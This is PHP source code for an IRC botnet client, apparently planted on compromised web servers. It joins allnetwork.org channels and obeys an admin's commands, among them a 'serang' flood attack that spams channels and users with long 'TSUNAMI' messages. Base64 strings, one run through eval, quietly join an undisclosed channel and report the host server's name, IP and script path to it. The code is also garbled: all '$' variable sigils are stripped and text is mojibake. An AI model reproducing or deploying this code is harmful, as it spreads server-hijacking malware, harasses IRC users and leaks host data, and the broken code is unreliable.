<!--
/*
+-------------------------------------+
|#####################################|
|#[ Kokain PHP BOT IRC v1.5	    ]#|
|#[ By Kokain 	 		    ]#|
|#[ Kokain         	            ]#|
|#[ irc: #Kokain  @ allnetwork.org  ]#|
|#####################################|
+-------------------------------------+
*/

function rx() {

/* Channel Bot */
channels = '#iluv'; // chanell pisahkan dengan spasi

/*** Admin ***/
admin = 'Kokain';
bot_password = '775492'; //Password untuk auth bot

localtest = 0; //1, Coba di localhost. 0, connect ke server irc
showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
nicklist = array(
"_ozhora001","_ozhora002","_ozhora003","_ozhora004","_ozhora005","_ozhora006","_ozhora007","_ozhora008","_ozhora009","_ozhora010","_ozhora011","_ozhora012","_ozhora013",
"_ozhora014","_ozhora015","_ozhora016","_ozhora017","_ozhora018","_ozhora019","_ozhora020","_ozhora001","_ozhora002","_ozhora003","_ozhora004","_ozhora005",
"_ozhora006","_ozhora007","_ozhora008","_ozhora009","_ozhora010","_ozhora011","_ozhora012","_ozhora013","_ozhora014","_ozhora015","_ozhora016","_ozhora017","kenzhi018",
"_ozhora019","_ozhora020","_ozhora021","_ozhora022","_ozhora023","_ozhora024","_ozhora025","_ozhora026","_ozhora027","_ozhora028","_ozhora029",
"_ozhora030","_ozhora021","_ozhora022","_ozhora023","_ozhora024","_ozhora025","_ozhora026","_ozhora027","_ozhora028","_ozhora029","_ozhora030","_ozhora01",
"_ozhora02","_ozhora03","_ozhora04","_ozhora05","_ozhora06","_ozhora07","_ozhora08","_ozhora09","_ozhora10","_ozhora11","_ozhora12","_ozhora13",
"_ozhora14","_ozhora15","_ozhora16","_ozhora17","_ozhora18","_ozhora19","_ozhora20","_ozhora21","_ozhora22","_ozhora23","_ozhora24","_ozhora25",
"_ozhora26","_ozhora27","_ozhora28","_ozhora29","_ozhora30","_ozhora01","_ozhora02","_ozhora03","_ozhora04","_ozhora05","_ozhora06","_ozhora07","_ozhora08",
"_ozhora09","_ozhora10","_ozhora12","_ozhora13","_ozhora14","_ozhora15","_ozhora16","_ozhora17","_ozhora18","_ozhora19","_ozhora20","bot001",
"bot002`","bot003","bot004","MySQL^","HTML^","CSS^","RFI^","Exploit^","Acess|Denied","Read|Only","Read|Error",
"Shells^","Hack^","Internet","Developer^","VhOzT^","HoSTiNg^","HyBiRdz^","HaRkcRew^","Free^","Blackz^","Bluez^",
"Mafia^","ReDz^","ReDhaTz^","Comunity^","BindPoRT^","TeaM^","CrewZ^","MuSic^","Wordpress^","Blogspot^","Multiply^",
"Geocities^","GuiTaRizT^","Drumerz^","CraCkErz^","DDOS^","HeXeDiTOr^","NeTChaT^","BuGz^","DoRkz^","OpenSsh^",
"NeTWoRkiNg^","PasCaL^","PeRl","RooTaTaCk^","RaTHoLe^","PuTTy^","Sniffer^","ScRiPTeRz^","SpYWaRe^","SSH^","TCP^",
"UDP^","WoRM^","UtilitY^","TooLZ^","TrOJaN^","DiGiTaLz^","RaCeR^","RaCInG^","TeaM^","StReeT^","SiMByaN^","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda",
	"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
	"Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins",
	"Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
	"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
	"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
	"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse",
	"Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo","Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
	"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
	"Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Book","Bookbinder","Boone",
	"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
	"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
	"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
	"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
	"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
	"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
	"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
	"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
	"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
	"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
	"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
	"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
	"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
	"Drinker","D'souza","Duffin","Durrett","Dussault"
);

identlist = array(
"serang","serang","serang","serang","serang","serang","serang","serang","serang","","serang",
"serang","serang","serang","serang","serang","serang","serang","serang","serang08","serang","serang",
"serang","target","scaner","lokal","masak","baju","celana","makan","minum","haha","wew"
);

realname = "15,1[4,1 Luv@Iluv 15,1] ";
identify = 'passwordnick';

//Server IRC
if (localtest == 1) { remotehost2 = array("localhost"); }
else {
remotehost2 = array("plasa.id.allnetwork.org",
	       "velo.id.allnetwork.org",
               "telkom.id.allnetwork.org",
               "indika.id.allnetwork.org",
               "citra.id.allnetwork.org",
               "uii.id.allnetwork.org",
               "visit.id.allnetwork.org",
               "hotspeed.sg.allnetwork.org",
               "indo.id.allnetwork.org",
	       "cbn.id.allnetwork.org",
               "ads.id.allnetwork.org",
               "punc4k.id.allnetwork.org",
	       "wanxp.id.allnetwork.org",
               "jmn.id.allnetwork.org",
	       "irc.indotransdata.net",
               "sbp.id.allnetwork.org",
               "big.id.allnetwork.org",
               "irc.indoforum.org",
               "irc.myquran.com",
               "irc.indowebster.com",);
}
port = "6667";
//Pesan
quitmsglist = array(
"Touch By &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[12,1 Kokain 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;",
"Touch By &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[11,1 Kokain 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;",
"Touch By &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[9,1 Kokain 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;",
"Touch By &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[4,1 Kokain 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;",
"Touch By &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[13,1 Kokain 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;",
"Touch By &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[7,1 Kokain 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;"
);
tsu1 = array("Mw","aa","aa","a","c","c","h","h");
tsu2 = array("r","I","p","C","u","r","L","^","_","^");
tsumsg = "4,11BeBeK 5aDuS Kokain6kAlI 12WekZ13WekRy4nZZ 14Wek1ZWek 15WekZ7WekZ 9,1BeBeK|Ry4nZ 13aDuS 12kAlI 4WekZW11ekZ We2kZWe7kRy4nZ Wek9ZWek10Z 8,2BeBeK a11DuS kA9lI We7kZWe0kZ WekZ11Wek We8kZWe13kZ 13,9BeBe1K aD12uS kAl3I We4kZWe7kZ Wek4ZWek W2ekZWe11kZ Ry4nZ12,4BeB14eK Ry4nZaD15uS kAl5I WekZ6WekZ Wek1ZWek Wek12ZWek13Z 11,6Be1BeK aDu2S kAl3I We4kZWe5kZ Wek7ZWek 8WekZ9Wek10Z 0,14BeBeK 14aDuS k13AlI W9ekZW4ekZ Ry4nZ11Wek7ZWek W8ekZW9ekZ 4,11BeBeK a12DuS Ry4nZ3kAl6I Wek5ZWek15Z Ry4nZWe13kZWek W9ekZW2ekZ 9,1BeBeK Ry4nZa14DuS";//400 Karakter
judul = "&#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#356; 15,1[9,1 sanzuit 15,1] &#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357;";

/*** Replacing ***/
nick       = nicklist[rand(0,count(nicklist) - 1)];
remotehost = remotehost2[rand(0,count(remotehost2) - 1)];
admin      = strtolower(admin);
auth       = array(admin => array("name" => admin, "pass" => bot_password, "auth" => 1,"status" => "Admin"));
username   = identlist[rand(0,count(identlist) - 1)];
channels   = strtolower(channels)." ";
channel    = explode(" ", channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
counterfp = 0;
raway = "on";
log   = "off";
saway = "1";
keluar = 0;
akill  = 1;
localhost = 'localhost';
dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!stime) { stime = time(); }
if (!port) { port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b>&#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357; Connecting to remotehost...</b>\n";

do {
  fp = fsockopen(remotehost,port, err_num, err_msg, 60);
  if(!fp) {
    if ( counterfp <= 200 ) {
      counterfp = counterfp + 1;
      rx();
    }
    else {
      echo "<br><b>Ga bisa connect ke remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      keluar = 1;
      exit;
    }
  }
  echo "<br><b>&#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357; Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  header = 'NICK '.nick . CRL;
  header .= 'USER '.username.' '.localhost.' '.remotehost.' :'.realname . CRL;
  fputs(fp, header);
  response = '';
  while (!feof(fp)) {
    response .= fgets(fp, 1024);
    if (showrespone == 1) { echo "<br>".response; }
    while (substr_count(response,CRL) != 0) {
      offset = strpos(response, CRL);
      data = substr(response,0,offset);
      response = substr(response,offset+2);
      if (substr(data,0,1) == ':') {
        offsetA = strpos(data, ' ');
        offsetB = strpos(data, ' :');
        offsetC = strpos(data, '!');
        dFrom = substr(data,1,offsetA-1);
        dCommand = substr(data,offsetA+1,offsetB-offsetA-1);
        dNick = substr(data,1,offsetC-1);
        iText = substr(data,offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr(dCommand,0,3) == '004' ) {
          fputs(fp, 'PRIVMSG nickserv :identify '.nick.' '.identify.  CRL);
          if (nickmode) { fputs(fp, 'MODE '.nick.' :'.nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs(fp, 'NOTICE ' . admin . ' :Hello bozz Kokain Ganteng !' .  CRL);
          fputs(fp, base64_decode("Sk9JTiAjQ29vTEJvWXpSYUNpbkdUZWFN") . CRL);
          /*** Join Channel ***/
          foreach (channel as v) {
            fputs(fp, 'JOIN '.v.CRL);
          }
        }
        elseif (substr(dCommand,0,3)=='432') {
          nick = nick.username;
		  fputs(fp, 'NICK '.nick . CRL);
        }
        //Nickname is already in use
        elseif (substr(dCommand,0,3)=='433') {
          nick = nicklist[rand(0,count(nicklist) - 1)];
          fputs(fp, 'NICK '.nick . CRL);
        }
        elseif (substr(dCommand,0,3)=='465') {
          print "<br><b>&#258;&#65533;â&#65533;&#65533;&#258;&#65533;Â&#357; Authentication diperlukan! Bot ini telah di-autokill.</b>";
          akill = 2;
        }
	    if (substr_count(dNick,'.allnetwork.org') > 0) {
          if (substr_count(iText,"*** Banned") > 0) {
            keluar = 1;
            exit;
          }
        }
        dcom = explode(" ", dCommand);
        dNick = strtolower(dNick);
        if (dcom[0]=='KICK' && dcom[2]==nick) {
          fputs(fp, 'JOIN ' .dcom[1]. CRL);
        }
        elseif (dcom[0]=='NICK' || dcom[0]=='PART' ) {
          if (auth["dNick"]) {
            if (auth["dNick"]["pass"]) {
              if (auth["dNick"]["auth"]==2) {
                if (dcom[0]=='NICK') {
                  com = explode(" ", data);
                  chnick = strtolower(str_replace(':','',com[2]));
                  if (dNick!=chnick) {
                    auth["dNick"]["auth"] = 1;
                    fputs(fp,'NOTICE '.chnick.' :mau kemana Admin!!' . CRL);
                  }
                }
                else {
                  auth["dNick"]["auth"] = 1;
                  fputs(fp,'NOTICE '.dNick.' :dasar Dudultz!!' . CRL);
                }
              }
            }
            else { fputs(fp,'NOTICE ' . dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif (dcom[0]=='307' && strtolower(dcom[2])==whois) {
          dcom[2] = strtolower(dcom[2]);
		  if (auth["dcom[2]"]) {
            if (auth["dcom[2]"]["pass"]) {
              if (auth["dcom[2]"]["auth"]==1) {
                auth["dcom[2]"]["auth"] = 2;
                whois = "";
			    fputs(fp,'NOTICE ' . dcom[2] . ' :You`re Authorized as '.auth["dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs(fp,'NOTICE ' . dcom[2] . ' :Boss memang keren!! ' . CRL); }
            }
            else { fputs(fp,'NOTICE ' . dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs(fp,'NOTICE ' . dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif (dcom[0]=='NOTICE') {
         com = explode(" ", data);
         if (com[3]==':KB' && com[4] && com[5] && com[6]) {
           msg = str_replace('','',data);
           msg = strstr(msg,":KB");
           msg = str_replace(":KB com[4]","",msg);
           fputs(fp, 'KICK '.com[4].' '.com[5].' :'.msg . CRL);
           fputs(fp, 'MODE '.com[4].' +b *!*'.com[6] . CRL);
         }
       }
       elseif (dcom[0]=='PRIVMSG') {
         com = explode(" ", data);
         if (com[3]==':VERSION') { fputs(fp,'NOTICE '.dNick.' :'.chr(1).'Pantek Apo Ang Caliak Caliak Dek ANg AAa..?'.chr(1) . CRL); }
         elseif (com[3]==':INFO') { datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjQ29vTEJvWXpSYWNpbmdUZWFNIDpIb3N0OiAkYmhvc3QgfCBSZWZlcmVyOiAkYnJ1cmkgfCBTY3JpcHQ6ICRicGhwIHwgSVA6ICRiaXAgfCBPd25lciBJUDogJGJyaXAgIi4gQ1JMKTs="; eval(base64_decode(datainfo)); }
         elseif (auth["dNick"]["status"] && com[3]==':auth' && com[4]) {
           if (auth["dNick"]) {
             if (auth["dNick"]["pass"]) {
               if (auth["dNick"]["auth"]==1) {
                 if (com[4]===auth["dNick"]["pass"]) {
                   auth["dNick"]["auth"] = 2;
                   fputs(fp,'NOTICE ' . dNick . ' :OK '.auth["dNick"]["status"].'!'.CRL);
                 }
                 else { fputs(fp,'NOTICE ' . dNick . ' :Password Salah!'.CRL); }
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :Boss memang GanTenG!'.CRL); }
             }
             else { fputs(fp,'NOTICE ' . dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs(fp,'NOTICE ' . dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif (auth["dNick"]["status"] && com[3]==':deauth') {
           if (auth["dNick"]) {
             if (auth["dNick"]["pass"]) {
               if (auth["dNick"]["auth"]==2) {
                 auth["dNick"]["auth"] = 1;
                 fputs(fp,'NOTICE ' . dNick . ' :Logged out! ' . CRL);
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs(fp,'NOTICE ' . dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs(fp,'NOTICE ' . dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif (auth["dNick"]["status"] && com[3]==':pass' && com[4]) {
           if (auth["dNick"]) {
             if (!auth["dNick"]["pass"]) {
               auth["dNick"]["pass"] = com[4];
               auth["dNick"]["auth"] = 1;
               fputs(fp,'NOTICE ' . dNick . ' :Your Auth Pass set to '.auth["dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs(fp,'NOTICE ' . dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs(fp,'NOTICE ' . dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif (auth["dNick"]["status"] && com[3]==':chgpass' && com[4] && com[5]) {
           if (auth["dNick"]) {
             if (auth["dNick"]["auth"]==2) {
               if (com[4]===auth["dNick"]["pass"]) {
                 auth["dNick"]["pass"] = com[5];
                 fputs(fp,'NOTICE ' . dNick . ' :Your New Auth Pass set to '.auth["dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs(fp,'NOTICE ' . dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs(fp,'NOTICE ' . dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif (auth["dNick"]["status"] && com[3]==':adduser' && com[4] && com[4]!=nick && com[5]) {
           com[4] = strtolower(com[4]);
           if (auth["dNick"]["auth"]==2) {
             if (auth["dNick"]["status"]=="Admin") {
               if (com[5]=="master" || com[5]=="user") {
                 auth["com[4]"]["name"] = com[4];
                 auth["com[4]"]["status"] = com[5];
                 fputs(fp,'NOTICE ' . dNick . ' :AddUser :'.com[4].' As My '.com[5] . CRL);
                 fputs(fp,'NOTICE ' . com[4] . ' :You`re Now Known As My '.com[5].' Added By '.dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif (auth["dNick"]["status"]=="master") {
               if (!auth["com[4]"]) {
                 if (com[5]=="user") {
                   auth["com[4]"]["name"] = com[4];
                   auth["com[4]"]["status"] = com[5];
                   fputs(fp,'NOTICE ' . dNick . ' :AddUser :'.com[4].' As My '.com[5] . CRL);
                   fputs(fp,'NOTICE ' . com[4] . ' :You`re Now Known As My '.com[5].' Added By '.dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs(fp,'NOTICE ' . dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs(fp,'NOTICE ' . dNick . ' :Unknown Status! Your Status is '.auth["dNick"]["status"] . CRL); }
           }
           else { fputs(fp,'NOTICE ' . dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif (auth["dNick"]["status"] && com[3]==':deluser' && com[4]) {
           com[4] = strtolower(com[4]);
           if (auth["dNick"]["auth"]==2) {
             if (auth["dNick"]["status"]=="Admin") {
               if (auth["com[4]"]["status"]=="master" || auth["com[4]"]["status"]=="user") {
                 unset(auth["com[4]"]);
                 fputs(fp,'NOTICE ' . dNick . ' :DelUser :'.com[4].' From My UserList ' . CRL);
                 fputs(fp,'NOTICE ' . com[4] . ' :Your Access As My User Has Been Deleted By '.dNick . CRL);
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif (auth["dNick"]["status"]=="master") {
               if (auth["com[4]"]["status"]=="user") {
                 unset(auth["com[4]"]);
                 fputs(fp,'NOTICE ' . dNick . ' :DelUser :'.com[4].' From My UserList ' . CRL);
                 fputs(fp,'NOTICE ' . com[4] . ' :Your Access As My User Has Been Deleted By '.dNick . CRL);
               }
               else { fputs(fp,'NOTICE ' . dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs(fp,'NOTICE ' . dNick . ' :Unknown Status! Your Status is '.auth["dNick"]["status"] . CRL); }
           }
           else { fputs(fp,'NOTICE ' . dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif (auth["dNick"]["status"]) {
           if (ereg(":`",com[3]) || ereg(":!",com[3])) {
             chan = strstr(dCommand,"#");
             anick = str_replace("PRIVMSG ","",dCommand);
             if (com[3]==':!auth') {
               if (auth["dNick"]["auth"]==2) {
                 fputs(fp,'NOTICE '.dNick.' :kamu adalah admin! ' . CRL);
               }
               else {
                 whois = dNick;
                 fputs(fp,'WHOIS '.dNick . CRL);
               }
             }
             elseif (com[3]==':`auth' && chan) {
               if (auth["dNick"]["auth"]==2) {
                 fputs(fp,'PRIVMSG '.chan.' :P4sUk4N sIaP.!!! '.dNick.' ! ' . CRL);
               }
               else { fputs(fp,'PRIVMSG '.chan.' :'.dNick.' NOT Authorized! ' . CRL); }
             }
             elseif (auth["dNick"]["auth"]==2) {
               if (com[3]==':`say' && com[4] && chan) {
                 msg = strstr(data,":`say");
                 msg = str_replace(":`say ","",msg);
                 fputs(fp,'PRIVMSG '.chan.' :'.msg. CRL);
               }
               elseif (com[3]==':`act' && com[4] && chan) {
                 msg = strstr(data,":`act");
                 msg = str_replace(":`act ","",msg);
                 fputs(fp,'PRIVMSG '.chan.' :ACTION '.msg.''. CRL);
               }
               elseif (com[3]==':`slap' && com[4] && chan) {
                 fputs(fp,'PRIVMSG '.chan.' :ACTION slaps '.com[4].' '.com[4].' '.com[4].' '.com[4].' '.com[4].' '.com[4].' xixixixixixi'. CRL);
               }
               elseif (com[3]==':`msg' && com[4] && com[5]) {
                 msg = strstr(data,":`msg");
                 msg = str_replace(":`msg com[4] ","",msg);
                 fputs(fp,'PRIVMSG '.com[4].' :'.msg. CRL);
               }
               elseif (com[3]==':`notice' && com[4] && com[5]) {
                 msg = strstr(data,":`notice");
                 msg = str_replace(":`notice com[4] ","",msg);
                 fputs(fp,'NOTICE '.com[4].' :'.msg. CRL);
               }
               elseif (com[3]==':`ctcp' && com[4] && com[5]) {
                 msg = strstr(data,":`ctcp");
                 msg = str_replace(":`ctcp com[4] ","",msg);
                 fputs(fp,'PRIVMSG '.com[4].' :'.msg.''. CRL);
               }
               elseif (com[3]==':`info' && auth["dNick"]["status"]=="Admin") {
                 bhost = _SERVER['HTTP_HOST'];
                 bip = _SERVER['SERVER_ADDR'];
                 bphp  = _SERVER['PHP_SELF'];
                 brip = _SERVER['REMOTE_ADDR'];
                 brport = _SERVER['REMOTE_PORT'];
                 fputs(fp,"NOTICE dNick :Host: bhost | Script: bphp | IP: bip | Your IP: brip Port:brport" . CRL);
               }
               elseif (com[3]==':`up' && chan) {
                 fputs(fp, 'PRIVMSG chanserv :op '.chan.' '.nick . CRL);
               }
               elseif (com[3]==':`down' && chan) {
                 fputs(fp, 'MODE '.chan.' +v-o '.nick.' '.nick . CRL);
               }
               elseif (com[3]==':`serang' && com[4] && auth["dNick"]["status"]!="user") {
                 nicktsu = tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].
                    tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1)- 1)].
                    tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].
                    tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)];
                 fputs(fp, 'NICK '.nicktsu . CRL);
                 if (substr(dCommand,0,3)=='433') {
                   nicktsu = tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].
                   tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].
                   tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].
                   tsu2[rand(0,count(tsu2) - 1)].tsu1[rand(0,count(tsu1) - 1)].tsu2[rand(0,count(tsu2) - 1)];
                   fputs(fp, 'NICK '.nicktsu . CRL);
                 }
                 msg = strstr(data,":`serang");
                 msg = str_replace(":`serang com[4]","",msg);
                 if (ereg("#", com[4])) {
                   fputs(fp, 'JOIN '.com[4] . CRL);
                   fputs(fp, 'PRIVMSG '.com[4].' :'.msg.tsumsg.CRL);
                   fputs(fp, 'NOTICE '.com[4].' :'.msg.tsumsg.CRL);
                   fputs(fp, 'PRIVMSG '.com[4].' :TSUNAMI'.msg.tsumsg. CRL);
                   fputs(fp, 'NOTICE '.com[4].' :'.msg.tsumsg.CRL);
                   fputs(fp, 'PART '.com[4].' :F1n15h3d w1th 400x4 ch4rz By Kokain -=4.3sCrIpT=-' . CRL);
                   fputs(fp, 'NICK '.nick . CRL);
                 }
                 else {
                   fputs(fp, 'NOTICE '.com[4].' :'.msg.tsumsg.CRL);
                   fputs(fp, 'PRIVMSG '.com[4].' :TSUNAMI'.msg.tsumsg. CRL);
                   fputs(fp, 'NOTICE '.com[4].' :TSUNAMI'.msg.tsumsg. CRL);
                   fputs(fp, 'NOTICE '.com[4].' :'.msg.tsumsg.CRL);
                   fputs(fp, 'NICK '.nick . CRL);
                 }
               }
               elseif (com[3]==':`cycle' && chan && auth["dNick"]["status"]!="user") {
                 msg = strstr(data,":`cycle");
                 if (ereg("#", com[4])) {
                   partchan = com[4];
                   msg = str_replace(":`cycle com[4]","",msg);
                 }
                 else {
                   partchan = chan;
                   msg = str_replace(":`cycle","",msg);
                 }
                 if (strlen(msg)<3) {
                   msg = '';
                 }
                 fputs(fp, 'PART '.partchan.' :'.msg . CRL);
                 fputs(fp, 'JOIN '.partchan . CRL);
               }
               elseif (com[3]==':`part' && auth["dNick"]["status"]=="Admin") {
                 msg = strstr(data,":`part");
                 if (ereg("#", com[4])) {
                   partchan = com[4];
                   msg = str_replace(":`part com[4]","",msg);
                 }
                 else {
                   partchan = chan;
                   msg = str_replace(":`part","",msg);
                 }
                 if (strlen(msg)<3) {
                   msg = '';
                 }
                 fputs(fp, 'PART '.partchan.' :'.msg . CRL);
                 remchan = strtolower(partchan);
                 if (in_array(remchan, channel)) {
                   channels = str_replace("remchan ","",channels);
                   unset(channel);
                   channel = explode(" ", channels);
                 }
                 foreach (channel as v) {
                   fputs(fp, 'JOIN '.v . CRL);
                 }
               }
               elseif (com[3]==':`join' && com[4] && auth["dNick"]["status"]=="Admin") {
                 if (!ereg("#",com[4])) { com[4]="#".com[4]; }
                 addchan = strtolower(com[4]);
                 if (!in_array(addchan, channel)) {
                   channel[]=addchan;
                   channels.="addchan ";
                 }
                 foreach (channel as v) {
                   sleep(rand(1,6));
                   fputs(fp, 'JOIN '.v . CRL);
                 }
               }
               elseif (com[3]==':`botnick' && com[4] && !chan && auth["dNick"]["status"]=="Admin") {
                 nick = com[4];
                 identify = com[5];
                 fputs(fp, 'NICK '.nick . CRL);
                 fputs(fp, 'PRIVMSG nickserv :identify '.nick.' '.identify.  CRL);
               }
               elseif (com[3]==':`k' && com[4] && chan) {
                 msg = strstr(data,":`k");
                 msg = str_replace(":`k com[4]","",msg);
                 fputs(fp, 'KICK '.chan.' '.com[4].' :'.msg . CRL);
               }
               elseif (com[3]==':`kb' && com[4] && chan) {
                 msg = strstr(data,":`kb");
                 msg = str_replace(":`kb com[4]","",msg);
                 fputs(fp, 'KICK '.chan.' '.com[4].' :'.msg . CRL);
                 fputs(fp, 'MODE '.chan.' +b '.com[4] . CRL);
               }
